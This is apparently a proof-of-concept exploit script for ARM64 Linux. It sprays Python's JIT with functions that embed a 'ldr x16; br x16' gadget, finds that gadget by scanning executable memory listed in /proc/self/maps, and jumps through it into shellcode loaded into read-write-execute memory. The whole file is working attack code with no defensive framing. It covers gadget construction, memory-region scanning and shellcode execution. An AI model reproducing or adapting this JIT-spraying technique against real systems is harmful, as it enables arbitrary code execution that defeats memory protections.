import ctypes
import mmap
import struct
import jitexecleak
from capstone import *
from multiprocessing import Process, set_start_method, Queue

# Capstone config
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
raw_gadgets = {
    b"\x00\x02\x1f\xd6": "br x16",
    b"\xc0\x03\x5f\xd6": "ret",
    b"\x50\x00\x00\x58\x00\x02\x1f\xd6": "ldr x16, [pc, #8]; br x16",
}
combo_gadget = b"\x50\x00\x00\x58" + b"\x00\x02\x1f\xd6"  # ldr x16, [pc, #8]; br x16
magic_values = [
    0x0000FFFF,
    0xFFFF0000,
    0xF0F0F0F0,
    0x0F0F0F0F,
    0xDEADBEEF,
    0xAAAAAAAA,
    0x55555555,
    0xFFFFFFFF,
]

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
print(f"[+] Loaded shellcode: {len(shellcode)} bytes")

# RWX mmap shellcode
libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p
sc_addr = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
ctypes.memmove(sc_addr, shellcode, len(shellcode))
print(f"[+] Shellcode mmap @ 0x{sc_addr:x}")

# RWX mmap trampoline
TRAMP = (
    b"\x50\x00\x00\x58" +  # ldr x16, [pc, #8]
    b"\x00\x02\x1f\xd6" +  # br x16
    struct.pack("<Q", sc_addr)
)
tramp_mem = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
ctypes.memmove(tramp_mem, TRAMP, len(TRAMP))
tramp_addr = tramp_mem
print(f"[+] Trampoline mmap @ 0x{tramp_addr:x} -> shellcode")

def make_combo_func(magic):
    def combo(x: int, s: str):
        acc = x
        g = (b'\x50\x00\x00\x58' + b'\x00\x02\x1f\xd6').decode('latin1')  # combo gadget
        for i in range(3000):
            acc ^= (magic & i)
            acc += (acc << 1)
            acc &= 0x0F0F0F0F
            s += str(i) + "123"  # ensure "123" is present for replace
            s = s.replace("123", g)
        return s.upper()
    return combo

def get_jit_regions():
    regions = []
    with open("/proc/self/maps") as f:
        for line in f:
            if "r-xp" in line and ("jit" in line.lower() or "[anon]" in line):
                start, end = [int(x, 16) for x in line.split()[0].split("-")]
                regions.append((start, end))
    return regions

def scan_region_for_combo_gadget(start, end):
    mem = ctypes.string_at(start, end - start)
    for i in range(len(mem) - 8):
        chunk = mem[i:i+8]
        if chunk == combo_gadget:
            return start + i
    return None

def spray_and_find(magic, queue):
    print(f"\n[*] Child spraying magic=0x{magic:08x}")
    combo = make_combo_func(magic)
    for _ in range(6000):
        combo(42, "123AA")
    try:
        _ = jitexecleak.leak_executor_jit(combo)
    except RuntimeError:
        return
    for start, end in get_jit_regions():
        addr = scan_region_for_combo_gadget(start, end)
        if addr:
            print(f"[+] combo-gadget found @ 0x{addr:x} (magic=0x{magic:08x})")
            queue.put(addr)
            return

if __name__ == "__main__":
    try:
        set_start_method("fork")
    except RuntimeError:
        pass

    queue = Queue()
    procs = []
    for magic in magic_values:
        p = Process(target=spray_and_find, args=(magic, queue))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()

    if not queue.empty():
        addr = queue.get()
        print(f"[*] Parent jumping to combo-gadget @ 0x{addr:x}")
        FUNC = ctypes.CFUNCTYPE(None)
        fn = FUNC(addr)
        fn()
    else:
        print("[-] No combo-gadget found by any child process")
